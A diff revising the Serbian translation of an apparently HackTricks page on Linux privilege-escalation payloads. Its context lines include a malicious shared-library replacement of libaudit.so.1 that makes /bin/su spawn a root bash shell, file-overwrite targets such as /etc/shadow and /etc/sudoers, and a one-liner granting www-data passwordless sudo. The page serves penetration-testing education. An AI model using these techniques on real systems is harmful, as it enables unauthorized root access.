@@ -1,4 +1,4 @@
-# Payloads za izvršavanje
+# Payload-i za izvršavanje
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -44,18 +44,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Prepisivanje fajla radi eskalacije privilegija
+## Prepisivanje datoteke radi eskalacije privilegija
 
-### Uobičajeni fajlovi
+### Uobičajene datoteke
 
-- Dodajte korisnika sa lozinkom u _/etc/passwd_
-- Promenite lozinku u _/etc/shadow_
-- Dodajte korisnika u sudoers u _/etc/sudoers_
-- Zloupotrebite docker preko docker socket-a, obično u _/run/docker.sock_ ili _/var/run/docker.sock_
+- Dodavanje korisnika sa lozinkom u _/etc/passwd_
+- Promena lozinke unutar _/etc/shadow_
+- Dodavanje korisnika u sudoers u _/etc/sudoers_
+- Zloupotreba Docker-a kroz Docker socket, obično u _/run/docker.sock_ ili _/var/run/docker.sock_
 
 ### Prepisivanje biblioteke
 
-Proverite biblioteku koju koristi neki binarni fajl, u ovom slučaju `/bin/su`:
+Proverite biblioteku koju koristi neki binary, u ovom slučaju `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-U ovom slučaju pokušajmo da oponašamo `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Dakle, proverite funkcije ove biblioteke koje koristi binarni fajl **`su`**:
+U ovom slučaju pokušajmo da se lažno predstavimo kao `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Dakle, proverite funkcije ove biblioteke koje koristi **`su`** binary:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` verovatno potiču iz biblioteke libaudit.so.1. Pošto će libaudit.so.1 biti prepisana zlonamernom shared library bibliotekom, ovi simboli bi trebalo da budu prisutni u novoj shared library biblioteci; u suprotnom program neće moći da pronađe simbol i izaći će.
+Simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` verovatno potiču iz biblioteke libaudit.so.1. Pošto će libaudit.so.1 biti prepisana zlonamernom deljenom bibliotekom, ovi simboli treba da budu prisutni u novoj deljenoj biblioteci; u suprotnom program neće moći da pronađe simbol i izaći će.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,13 +98,13 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Sada ćete, samo pozivanjem **`/bin/su`**, dobiti shell kao root.
+Sada ćete samo pozivanjem **`/bin/su`** dobiti shell kao root.
 
 ## Skripte
 
 Možete li naterati root da izvrši nešto?
 
-### **www-data to sudoers**
+### **www-data u sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
